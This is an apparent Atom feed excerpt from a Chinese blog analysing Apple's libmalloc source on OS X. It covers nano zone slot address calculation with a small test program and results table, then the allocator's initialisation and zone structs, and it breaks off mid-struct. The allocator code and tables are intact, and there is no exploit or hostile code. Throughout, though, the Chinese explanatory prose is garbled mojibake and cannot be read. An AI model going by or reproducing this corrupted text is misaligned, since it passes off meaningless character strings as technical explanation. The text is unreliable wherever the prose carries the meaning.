<p>å…ˆæ ¹æ®ä¸åŒçš„<code>mag_index</code>å’Œ<code>slot_bytes</code>å¡«å†™<code>union</code>ä¸­çš„<code>fileds</code>ã€‚å› ä¸º<code>union</code>ä½¿ç”¨ä¸åŒçš„æ•°æ®ç±»å‹èŒƒå›´åŒä¸€å—å†…å­˜ã€‚æ‰€ä»¥ç”¨<code>u.addr</code>æ¥è·å–å‰é¢å¡«å…¥çš„æ•°æ®ï¼Œå°±å¾—åˆ°äº†å½“å‰çš„<code>slot_current_base_addr</code>ã€‚</p>
<p>é€šè¿‡ä¸€æ®µç®€å•çš„ä»£ç æ¥éªŒè¯ä¸€ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nano_blk_addr_t</span> u;</span><br><span class="line"> <span class="keyword">uintptr_t</span> p;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"mag,band,slot,addr"</span>);</span><br><span class="line"> <span class="keyword">int</span> imag=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">int</span> iband=<span class="number">0</span> ;</span><br><span class="line"> <span class="keyword">int</span> islot_bytes=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span> (imag = <span class="number">0</span>;imag!=<span class="number">32</span>;imag++) &#123;</span><br><span class="line">     <span class="keyword">for</span> (iband = <span class="number">0</span> ; iband!=<span class="number">2</span> ; iband++) &#123;</span><br><span class="line">         <span class="keyword">for</span> (islot_bytes=<span class="number">16</span>;islot_bytes!=<span class="number">256</span>+<span class="number">16</span>;islot_bytes = islot_bytes + <span class="number">16</span>) &#123;</span><br><span class="line">             u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">             u.fields.nano_mag_index = imag;</span><br><span class="line">             u.fields.nano_band = iband;</span><br><span class="line">             u.fields.nano_slot = (islot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">             u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">             p = u.addr;</span><br><span class="line">             <span class="comment">//mach_vm_address_t vm_addr = p &amp; ~((uintptr_t)(BAND_SIZE - 1));</span></span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\n%d,%d,%d,%llx"</span>,imag,iband,islot_bytes,u.addr);</span><br><span class="line">    </span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>æ‰“å°çš„ç»“æœå¤ªå¤šäº†ï¼Œè¿™é‡Œå°±æ•´ç†å‡ºæ¯”è¾ƒæœ‰ç‰¹å¾çš„å‡ ä¸ªç»“æœï¼Œç”¨ä½œåˆ†æã€‚</p>
<table>
<thead>
<tr>
<th>mag</th>
<th>band</th>
<th>slot</th>
<th>addr</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>16</td>
<td>0x600000000000</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>32</td>
<td>0x600000020000</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>256</td>
<td>0x6000001e0000</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>16</td>
<td>0x600000200000</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>256</td>
<td>0x6000003e0000</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>16</td>
<td>0x608000000000</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>16</td>
<td>0x608000200000</td>
</tr>
</tbody>
</table>
<p>è¡¨-1</p>
<p>å¯ä»¥æ˜æ˜¾çœ‹å‡ºæœ‰ä¸€ä¸‹å‡ ä¸ªç‰¹æ€§</p>
<ul>
<li>æ‰€æœ‰çš„<code>band</code>åŸºå€æ˜¯ä»<code>0x600000000000</code>å¼€å§‹çš„ã€‚</li>
<li>æ¯ä¸€ä¸ª<code>cpu</code>å•ç‹¬ä½¿ç”¨ä¸€ä¸ª<code>band</code>ï¼š<code>mag</code>ä¸åŒçš„æ—¶å€™ï¼Œ<code>band</code>å·ä¸º0ï¼Œ<code>slot_bytes</code>ä¸º16æ—¶ï¼Œä¸¤ä¸ª<code>addr</code>ä¸åŒã€‚</li>
<li>åŒä¸€ä¸ª<code>cpu</code>çš„ä¸€ä¸ª<code>band</code>ç”¨å®Œä¹‹åï¼Œçº¿æ€§çš„ç”³è¯·ä¸‹ä¸€ä¸ª<code>band</code>ã€‚</li>
<li>ç›¸åŒçš„<code>band</code>ï¼Œå³<code>band</code>å·ç›¸åŒæ—¶,0x200000(2MB)çš„ç©ºé—´ï¼Œè¢«åˆ’åˆ†ä¸º0x10(16)ä¸ªï¼Œå¤§å°ä¸º0x2000(128KB)çš„<code>slot</code>ã€‚ä¸”ä¸ºçº¿æ€§åˆ†å¸ƒã€‚</li>
</ul>
<p>è€Œä¸æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æƒ…å†µåˆ™ååˆ†ç®€å•ï¼Œç›´æ¥åœ¨<code>slot_current_base_addr</code>çš„åŸºç¡€ä¸Šæ·»åŠ <code>BAND_SIZE</code>ï¼Œä¹Ÿå°±æ˜¯2MB(0x200000)è·å–æ–°çš„<code>slot_current_base_addr</code>ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>å½“<code>band</code>ä¸º0ï¼Œ<code>slot_bytes</code>ä¸º256æ—¶ï¼Œæ–°çš„<code>slot_current_base_addr</code>ä¸º</p>
<blockquote>
<p>0x6000001e0000+0x200000=0x6000003e0000</p>
</blockquote>
<p>ä¸è¡¨-1ä¸­ç»“æœä¸€è‡´ã€‚</p>
<p>ä½™ä¸‹çš„ä»£ç æ¯”è¾ƒå¥½ç†è§£ï¼Œå°±æ˜¯æ ¹æ®è®¡ç®—å‡ºæ¥çš„åœ°å€ï¼Œæƒ³å†…æ ¸ç”³è¯·å†…å­˜ï¼Œä¸”æ ¹æ®ç›¸å…³æ•°æ®å¡«å†™<code>pMeta</code>çš„çš„æ•°æ®ï¼Œåœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨<code>malloc</code>æ—¶ï¼Œéå¸¸æ–¹ä¾¿çš„ä»å·²ç»å¤„ç†å¥½çš„<code>pMeta</code>ä¸­è·å–å†…å­˜ç©ºé—´ã€‚å†æ ¹æ®pMetaä¸­ç›¸å…³çš„æ•°æ®ï¼Œè®¡ç®—å¾—åˆ°éœ€è¦è¿”å›ç»™è°ƒç”¨è€…çš„æŒ‡é’ˆã€‚</p>
<h1 id="nano_free">nano_free</h1><p><code>free</code>çš„æ“ä½œï¼Œç›¸å¯¹ç®€å•ï¼Œå°±æ˜¯å°†ä¸ç”¨çš„å†…å­˜ï¼Œæ·»åŠ åˆ°æ¯ä¸€ä¸ªpMetaçš„é˜Ÿåˆ—ä¹‹ä¸­ï¼Œè€Œæ¯ä¸€ä¸ªé˜Ÿåˆ—ï¼Œåœ¨<code>malloc</code>æ—¶ï¼Œå¦‚æœå‘ç°éœ€è¦ä½¿ç”¨çš„é˜Ÿåˆ—ä¸­å­˜åœ¨å…ƒç´ ï¼Œåˆ™ä¼˜å…ˆä½¿ç”¨é˜Ÿåˆ—ä¸­å·²ç»é‡Šæ”¾çš„å†…å­˜ã€‚</p>
<p>é€»è¾‘ç›¸å¯¹ç®€å•ï¼Œå°±ä¸å¯¹æºç åšå‡ºåˆ†æäº†ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œé˜…è¯»æºç ã€‚ç›¸ä¿¡åœ¨äº†è§£äº†ä¸Šé¢æµç¨‹ä¹‹åï¼Œä¸æ˜¯ä¸€ä»¶éš¾çš„äº‹æƒ…ã€‚</p>
<h1 id="å°ç»“">å°ç»“</h1><p><code>nano</code>çš„å†…å­˜åˆ†é…é€»è¾‘ç›¸å¯¹ç®€å•ï¼Œå’Œä¹‹å‰åˆ†æè¿‡çš„<code>linux</code><a href="http://turingh.github.io/2015/12/14/protostar-heap3/">å †å†…å­˜çš„åˆ†é…ç­–ç•¥</a>æ˜¯ä¸åŒçš„ï¼Œåœ¨æ‰€ç”³è¯·çš„å†…å­˜èŒƒå›´å¾ˆå°çš„æ—¶å€™ï¼Œå¯ä»¥åŠ å¿«ç”³è¯·çš„é€Ÿåº¦ï¼Œå¹¶ä¸”æé«˜å†…å­˜çš„å¤ç”¨ã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="æ‘˜è¦">æ‘˜è¦</h1><p>æ ¹æ®ç”³è¯·å†…å­˜çš„å¤§å°ä¸åŒï¼Œ<code>libmalloc</code>ä¼šä»ä¸åŒçš„å †ä¸Šç©ºé—´å°†å†…å­˜åˆ†é…ç»™ç”³è¯·è€…ï¼Œè€Œæœ€å°çš„ä¸€ä¸ªä¸€æ¡£ï¼Œæ˜¯ä»<code>nano_zone_s</code>ä¸­ï¼Œé€šè¿‡<code>nano_*</code>å‡½æ•°è·å–å †ä¸Šå·²åˆ†é…çš„å†…å­˜ã€‚</p>]]>
    
    </summary>
    
      <category term="malloc" scheme="http://turingh.github.io/tags/malloc/"/>
    
      <category term="nano" scheme="http://turingh.github.io/tags/nano/"/>
    
      <category term="åŸºæœ¬åŠŸè¦æ‰å®" scheme="http://turingh.github.io/tags/%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%A6%81%E6%89%8E%E5%AE%9E/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[libmallocæºç åˆ†æä¹‹åˆå§‹åŒ–]]></title>
    <link href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96/"/>
    <id>http://turingh.github.io/2016/06/28/libmallocæºç åˆ†æä¹‹åˆå§‹åŒ–/</id>
    <published>2016-06-28T19:22:51.000Z</published>
    <updated>2016-06-28T22:04:39.000Z</updated>
    <content type="html"><![CDATA[<h1 id="æ‘˜è¦">æ‘˜è¦</h1><p>ä¸ºäº†åŠ æ·±å¯¹<code>OS X</code>ç³»ç»Ÿåœ¨åº”ç”¨å±‚å †å†…å­˜åˆ†é…çš„äº†è§£ï¼Œå¯¹<code>libmalloc</code>è¿›è¡Œäº†é˜…è¯»ä¸ç†è§£ã€‚</p>
<ul>
<li>åŠ å¼ºå¯¹å †ä¸Šå†…å­˜åˆ†å¸ƒçš„ç†è§£</li>
<li>é‡åˆ°å†…å­˜æ³„éœ²é—®é¢˜éœ€è¦å¤„ç†æ—¶ï¼Œå¯¹å †åˆ†é…ç­–ç•¥çš„äº†è§£ï¼Œå¯ä»¥æé«˜åˆ†æçš„é€Ÿåº¦ä¸ç²¾ç¡®åº¦</li>
<li>é‡åˆ°å †å†…å­˜æ¼æ´åˆ©ç”¨æ—¶ï¼Œå¯ä»¥æ›´åŠ æ¸…æ¥šçš„ç†è§£<code>EXP</code>çš„åŸç†ï¼Œåšå‡ºæ›´ç²¾å‡†çš„åˆ†æ</li>
</ul>
<p>é˜…è¯»æœ¬æ–‡ä¹‹å‰å¯ä»¥å…ˆç¨å¾®äº†è§£ä¸€ä¸‹<code>OS X</code>åœ¨å †ä¸Šçš„å†…å­˜å¤„ç†çš„å¤§è‡´æƒ…å†µï¼Œç‚¹<a href="https://yq.aliyun.com/articles/3065" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚äº†è§£å¤§è‡´æƒ…å†µä¹‹åï¼Œæ‰èƒ½æ›´å¥½çš„ç†è§£æºç çš„è®¾è®¡ã€‚</p>
<a id="more"></a>
<h1 id="ä»mallocå¼€å§‹">ä»mallocå¼€å§‹</h1><h2 id="åˆå§‹åŒ–">åˆå§‹åŒ–</h2><p>æ‰€æœ‰çš„é€»è¾‘éƒ½æ˜¯åœ¨åº”ç”¨å±‚è°ƒç”¨<code>malloc</code>å‡½æ•°æ—¶å¼€å§‹çš„ï¼Œè¿™é‡Œæ˜¯<code>malloc</code>å‡½æ•°çš„å®ç°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc</span><span class="params">(size_t size)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*retval;</span><br><span class="line">	retval = malloc_zone_malloc(inline_malloc_default_zone(), size);</span><br><span class="line">	<span class="keyword">if</span> (retval == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		errno = ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*......*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> malloc_zone_t *</span><br><span class="line"><span class="title">inline_malloc_default_zone</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!_malloc_is_initialized) _malloc_initialize();</span><br><span class="line">	<span class="comment">// _malloc_printf(ASL_LEVEL_INFO, "In inline_malloc_default_zone with %d %d\n", malloc_num_zones, malloc_has_debug_zone);</span></span><br><span class="line">	<span class="keyword">return</span> malloc_zones[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºï¼Œ<code>libmalloc</code>æ˜¯åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨<code>malloc</code>å‡½æ•°çš„çš„æ—¶å€™ï¼Œé€šè¿‡<code>inline_malloc_default_zone</code>æ¥è¿›è¡Œå †ä¸Šæ•°æ®çš„åˆå§‹åŒ–ã€‚è€Œ<code>inline_malloc_default_zone</code>å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨<code>_malloc_initialize</code>æ¥å®Œæˆæœ€ç»ˆçš„å†…å­˜ç©ºé—´åˆå§‹åŒ–ã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_malloc_initialize(<span class="keyword">void</span>) &#123;</span><br><span class="line">	MALLOC_LOCK();</span><br><span class="line">	<span class="keyword">if</span> (!_malloc_is_initialized) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> n;</span><br><span class="line">		<span class="keyword">malloc_zone_t</span>	*zone;</span><br><span class="line">		_malloc_is_initialized = TRUE;</span><br><span class="line">		set_flags_from_environment(); <span class="comment">// will only set flags up to two times</span></span><br><span class="line">		n = malloc_num_zones;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CONFIG_NANOZONE <span class="comment">//å¯ä»¥é€šè¿‡å®æ§åˆ¶æ˜¯å¦ä½¿ç”¨nano_zone.</span></span></span><br><span class="line">      </span><br><span class="line">      	<span class="comment">//åˆ›å»ºä¸€ä¸ªä¼šå˜åŒ–çš„zone</span></span><br><span class="line">		<span class="keyword">malloc_zone_t</span> *helper_zone = create_scalable_zone(<span class="number">0</span>, malloc_debug_flags);</span><br><span class="line">		<span class="comment">//åˆ›å»ºä¸€ä¸ªnano_zone,ä½¿ç”¨helper_zoneä½œä¸ºnano_zoneçš„</span></span><br><span class="line">      	zone = create_nano_zone(<span class="number">0</span>, helper_zone, malloc_debug_flags);</span><br><span class="line">	</span><br><span class="line">      	<span class="comment">/*...*/</span></span><br><span class="line">    &#125;</span><br><span class="line">	MALLOC_UNLOCK();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="malloc_zone_tã€szone_tã€nanozone_t">malloc_zone_tã€szone_tã€nanozone_t</h3><p>è¿™é‡Œéœ€è¦å…ˆäº†è§£ä¸€ä¸‹åœ¨å †ç©ºé—´åˆå§‹åŒ–ä¸­ï¼Œéå¸¸é‡è¦çš„ä¸¤ä¸ªæ•°æ®ç»“æ„ã€‚<code>malloc_zone_t</code>å’Œ<code>szone_t</code>ã€‚</p>
<h4 id="malloc_zone_t">malloc_zone_t</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> &#123;</span><br><span class="line">    <span class="comment">/* Only zone implementors should depend on the layout of this structure;</span><br><span class="line">    Regular callers should use the access functions below */</span></span><br><span class="line">    <span class="keyword">void</span>	*reserved1;	<span class="comment">/* RESERVED FOR CFAllocator DO NOT USE */</span></span><br><span class="line">    <span class="keyword">void</span>	*reserved2;	<span class="comment">/* RESERVED FOR CFAllocator DO NOT USE */</span></span><br><span class="line">    <span class="keyword">size_t</span> 	(*size)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">const</span> <span class="keyword">void</span> *ptr); <span class="comment">/* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */</span></span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">malloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size);</span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">calloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> num_items, <span class="keyword">size_t</span> size); <span class="comment">/* same as malloc, but block returned is set to zero */</span></span><br><span class="line">    <span class="keyword">void</span> 	*(*valloc)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size); <span class="comment">/* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */</span></span><br><span class="line">    <span class="keyword">void</span> 	(*<span class="built_in">free</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr);</span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">realloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size);</span><br><span class="line">    <span class="keyword">void</span> 	(*destroy)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone); <span class="comment">/* zone is destroyed and all memory reclaimed */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>	*zone_name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optional batch callbacks; these may be NULL */</span></span><br><span class="line">    <span class="keyword">unsigned</span>	(*batch_malloc)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size, <span class="keyword">void</span> **results, <span class="keyword">unsigned</span> num_requested); <span class="comment">/* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */</span></span><br><span class="line">    <span class="keyword">void</span>	(*batch_free)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> **to_be_freed, <span class="keyword">unsigned</span> num_to_be_freed); <span class="comment">/* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span>	*introspect;</span><br><span class="line">    <span class="keyword">unsigned</span>	version;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */</span></span><br><span class="line">    <span class="keyword">void</span> *(*memalign)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> alignment, <span class="keyword">size_t</span> size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/</span></span><br><span class="line">    <span class="keyword">void</span> (*free_definite_size)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */</span></span><br><span class="line">    <span class="keyword">size_t</span> 	(*pressure_relief)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> goal);</span><br><span class="line">&#125; <span class="keyword">malloc_zone_t</span>;</span><br></pre></td></tr></table></figure>
<p><code>malloc_zone_t</code>éå¸¸ç®€å•ï¼Œå°±æ˜¯ä¸€å †å‡½æ•°æŒ‡é’ˆï¼Œç”¨æ¥å­˜å‚¨ä¸€å †ç›¸å…³çš„å¤„ç†å‡½æ•°çš„å…·ä½“å®ç°çš„åœ°å€ï¼Œä¾‹å¦‚<code>malloc</code>ã€<code>free</code>ã€<code>realloc</code>ç­‰å‡½æ•°çš„å…·ä½“å®ç°ã€‚</p>
<h4 id="szone_tã€nanozone_t">szone_tã€nanozone_t</h4><p><code>szone_t</code>å…¶å®ä¸<code>malloc_zone_t</code>æ‰€æè¿°çš„æ˜¯åŒä¸€å—<code>zone</code>ï¼Œä½†æ˜¯<code>szone_t</code>çš„ç»“æ„ä¸­å­˜æœ‰å¤§é‡çš„<code>libmalloc</code>å†…éƒ¨é€»è¾‘ä¼šä½¿ç”¨åˆ°çš„æ•°æ®ç»“æ„ã€‚ä»–çš„ç»“æ„ä½“é‡ç¬¬ä¸€ä¸ªç»„æˆéƒ¨åˆ†å°±æ˜¯malloc_zone_tã€‚</p>
<p>å¯ä»¥ç†è§£ä¸ºï¼Œ<code>szone_t</code>ç»“æ„ç”¨æ¥æè¿°äº†è¿™ä¸€å—å †ä¸Šåˆå§‹åŒ–å‡ºæ¥çš„<code>zone</code>çš„æ‰€æœ‰å†…éƒ¨å±æ€§å’ŒçŠ¶æ€ï¼Œè€Œ<code>malloc_zone_t</code>æ˜¯å¯¹å¤–æä¾›çš„ç”¨æ¥å¤„ç†è¯¥<code>zone</code>å†…éƒ¨æ•°æ®çš„æ‰€æœ‰æ¥å£ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> szone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		cpu_id_key;		<span class="comment">// unused</span></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">void</span>			*log_address;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Regions for tiny objects */</span></span><br><span class="line">	_malloc_lock_s	tiny_regions_lock CACHE_ALIGN;</span><br><span class="line">	<span class="keyword">size_t</span>			num_tiny_regions;</span><br><span class="line">	<span class="keyword">size_t</span>			num_tiny_regions_dealloc;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	*tiny_region_generation;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	trg[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>				num_tiny_magazines;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_tiny_magazines_mask;</span><br><span class="line">	<span class="keyword">int</span>				num_tiny_magazines_mask_shift;</span><br><span class="line">	<span class="keyword">magazine_t</span>			*tiny_magazines; <span class="comment">// array of per-processor magazines</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uintptr_t</span>			last_tiny_advise;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Regions for small objects */</span></span><br><span class="line">	_malloc_lock_s	small_regions_lock CACHE_ALIGN;</span><br><span class="line">	<span class="keyword">size_t</span>			num_small_regions;</span><br><span class="line">	<span class="keyword">size_t</span>			num_small_regions_dealloc;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	*small_region_generation;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	srg[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			num_small_slots; <span class="comment">// determined by physmem size</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>				num_small_magazines;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_small_magazines_mask;</span><br><span class="line">	<span class="keyword">int</span>				num_small_magazines_mask_shift;</span><br><span class="line">	<span class="keyword">magazine_t</span>			*small_magazines; <span class="comment">// array of per-processor magazines</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uintptr_t</span>			last_small_advise;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* large objects: all the rest */</span></span><br><span class="line">	_malloc_lock_s		large_szone_lock CACHE_ALIGN; <span class="comment">// One customer at a time for large</span></span><br><span class="line">	<span class="keyword">unsigned</span>			num_large_objects_in_use;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_large_entries;</span><br><span class="line">	<span class="keyword">large_entry_t</span>		*large_entries; <span class="comment">// hashed by location; null entries don't count</span></span><br><span class="line">	<span class="keyword">size_t</span>			num_bytes_in_large_objects;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> LARGE_CACHE</span></span><br><span class="line">	<span class="keyword">int</span>				large_entry_cache_oldest;</span><br><span class="line">	<span class="keyword">int</span>				large_entry_cache_newest;</span><br><span class="line">	<span class="keyword">large_entry_t</span>		large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; <span class="comment">// "death row" for large malloc/free</span></span><br><span class="line">	<span class="keyword">boolean_t</span>			large_legacy_reset_mprotect;</span><br><span class="line">	<span class="keyword">size_t</span>			large_entry_cache_reserve_bytes;</span><br><span class="line">	<span class="keyword">size_t</span>			